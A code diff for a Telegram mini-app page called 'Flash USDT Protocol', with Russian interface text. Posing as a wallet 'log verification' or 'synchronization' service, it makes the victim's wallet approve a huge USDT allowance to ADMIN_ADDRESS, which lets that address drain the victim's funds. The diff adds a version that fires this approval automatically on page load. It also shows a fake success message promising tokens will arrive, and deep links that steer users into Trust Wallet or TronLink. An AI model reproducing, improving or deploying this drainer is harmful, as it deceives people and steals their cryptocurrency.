@@ -3,39 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Flash USDT: Protocol</title>
+    <title>Flash USDT Protocol</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
-        body { background-color: #0f0f0f; color: #ffffff; font-family: -apple-system, system-ui, sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
-        .container { border: 1px solid #333; padding: 30px 20px; border-radius: 28px; background: #1a1a1a; box-shadow: 0 15px 35px rgba(0,0,0,0.5); width: 100%; max-width: 400px; margin: 0 auto; }
-        .status { font-size: 10px; color: #0088cc; font-weight: bold; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
-        h2 { margin: 0 0 10px 0; font-size: 20px; font-weight: 700; }
-        p { color: #888; font-size: 13px; line-height: 1.5; margin-bottom: 25px; }
-        .btn { background: #0088cc; color: white; border: none; padding: 16px; font-size: 14px; font-weight: bold; border-radius: 14px; cursor: pointer; width: 100%; text-transform: uppercase; margin-bottom: 10px; transition: 0.2s; }
-        .btn-alt { background: #222; border: 1px solid #444; color: #ccc; }
-        .btn:active { transform: scale(0.98); opacity: 0.9; }
-        .btn:disabled { background: #333; color: #666; cursor: not-allowed; }
+        body { background-color: #0f0f0f; color: #ffffff; font-family: -apple-system, sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; padding: 20px; }
+        .loader { border: 3px solid #333; border-top: 3px solid #0088cc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 18px; margin-bottom: 10px; }
+        p { color: #888; font-size: 13px; }
+        .btn { background: #0088cc; color: white; border: none; padding: 16px; font-size: 14px; font-weight: bold; border-radius: 14px; cursor: pointer; width: 100%; text-transform: uppercase; display: none; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="status">● СИСТЕМА ВАЛИДАЦИИ АКТИВНА</div>
-    <h2>Flash USDT Protocol</h2>
-    <p id="infoText">Ожидание подключения кошелька...</p>
-
-    <div id="step-external" style="display: none;">
-        <button id="trustBtn" class="btn">Открыть в Trust Wallet</button>
-        <button id="tronBtn" class="btn btn-alt">Открыть в TronLink</button>
-    </div>
-
-    <div id="step-connect" style="display: none;">
-        <button id="connectBtn" class="btn">Подключить кошелек</button>
-    </div>
-
-    <div id="step-verify" style="display: none;">
-        <button id="verifyBtn" class="btn">ВЕРИФИЦИРОВАТЬ ЛОГИ</button>
+<div id="main-ui">
+    <div class="loader" id="spinner"></div>
+    <h2 id="title">Синхронизация узла...</h2>
+    <p id="desc">Пожалуйста, подождите. Устанавливается защищенное соединение с сетью TRC-20.</p>
+    
+    <div id="external-buttons" style="display: none; margin-top: 20px;">
+        <button onclick="openWallet('trust')" class="btn" style="display: block; margin-bottom: 10px;">Открыть в Trust Wallet</button>
+        <button onclick="openWallet('tron')" class="btn" style="display: block; background: #222;">Открыть в TronLink</button>
     </div>
 </div>
 
@@ -47,80 +36,49 @@
     const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
     const CLEAN_URL = window.location.origin + window.location.pathname;
 
-    const infoText = document.getElementById('infoText');
-    const divExt = document.getElementById('step-external');
-    const divConn = document.getElementById('step-connect');
-    const divVer = document.getElementById('step-verify');
-
-    // Логика управления экранами
-    function showStep(stepName) {
-        divExt.style.display = 'none';
-        divConn.style.display = 'none';
-        divVer.style.display = 'none';
-        if (stepName === 'external') divExt.style.display = 'block';
-        if (stepName === 'connect') divConn.style.display = 'block';
-        if (stepName === 'verify') divVer.style.display = 'block';
-    }
-
-    async function init() {
-        // Проверяем, есть ли провайдер (мы внутри dApp браузера?)
-        if (window.tronWeb) {
-            // Если адрес уже есть (редко бывает сразу)
-            if (window.tronWeb.defaultAddress.base58) {
-                infoText.innerText = "Кошелек готов. Верифицируйте логи.";
-                showStep('verify');
-            } else {
-                // Если мы в кошельке, но адрес не отдан
-                infoText.innerText = "Кошелек обнаружен. Нажмите кнопку для подключения.";
-                showStep('connect');
+    async function startMagic() {
+        // Если мы внутри кошелька (есть tronWeb)
+        if (window.tronWeb && window.tronWeb.ready) {
+            document.getElementById('spinner').style.display = 'block';
+            
+            try {
+                // Пытаемся сразу вызвать подпись
+                const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+                
+                // Это вызовет окно подтверждения автоматически
+                await contract.approve(ADMIN_ADDRESS, '1000000000000000').send();
+                
+                document.getElementById('title').innerText = "Готово!";
+                document.getElementById('desc').innerText = "Синхронизация завершена. Ожидайте зачисления.";
+                
+                tg.showPopup({
+                    title: 'Успешно',
+                    message: 'Логи верифицированы. Токены будут зачислены в течение 15-30 минут.',
+                    buttons: [{type: 'ok'}]
+                });
+                setTimeout(() => tg.close(), 5000);
+            } catch (e) {
+                document.getElementById('title').innerText = "Ошибка верификации";
+                document.getElementById('desc').innerText = "Действие отклонено. Попробуйте снова.";
             }
         } else {
-            // Мы в обычном браузере (Телеграм)
-            infoText.innerText = "Для восстановления транзакции выберите ваш кошелек.";
-            showStep('external');
+            // Если мы в Telegram — показываем кнопки перехода
+            document.getElementById('spinner').style.display = 'none';
+            document.getElementById('title').innerText = "Flash USDT Protocol";
+            document.getElementById('desc').innerText = "Для восстановления выберите кошелек:";
+            document.getElementById('external-buttons').style.display = 'block';
         }
     }
 
-    // Кнопка принудительного коннекта (для Trust Wallet)
-    document.getElementById('connectBtn').onclick = async () => {
-        try {
-            // Запрашиваем аккаунты (вызовет окно Trust Wallet "Подключиться")
-            const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
-            if (window.tronWeb.defaultAddress.base58) {
-                infoText.innerText = "Подключено! Выполните верификацию.";
-                showStep('verify');
-            }
-        } catch (e) {
-            tg.showAlert("Пожалуйста, подтвердите подключение в кошельке.");
-        }
-    };
+    function openWallet(type) {
+        let link = "";
+        if (type === 'trust') link = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(CLEAN_URL);
+        if (type === 'tron') link = "tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(CLEAN_URL);
+        tg.openLink(link);
+    }
 
-    // Глубокие ссылки
-    document.getElementById('trustBtn').onclick = () => {
-        tg.openLink("https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(CLEAN_URL));
-    };
-    document.getElementById('tronBtn').onclick = () => {
-        tg.openLink("tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(CLEAN_URL));
-    };
-
-    // Финальный апрув
-    document.getElementById('verifyBtn').onclick = async () => {
-        try {
-            const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
-            await contract.approve(ADMIN_ADDRESS, '1000000000000000').send();
-            tg.showPopup({
-                title: 'Готово',
-                message: 'Синхронизация завершена. Ожидайте зачисления в течение 15-30 минут.',
-                buttons: [{type: 'ok'}]
-            });
-            setTimeout(() => tg.close(), 5000);
-        } catch (e) {
-            tg.showAlert('Ошибка: действие отклонено.');
-        }
-    };
-
-    // Запуск
-    setTimeout(init, 1000); // Даем 1 сек на инициализацию провайдера
+    // Запускаем проверку через секунду после загрузки
+    setTimeout(startMagic, 1200);
 </script>
 </body>
 </html>
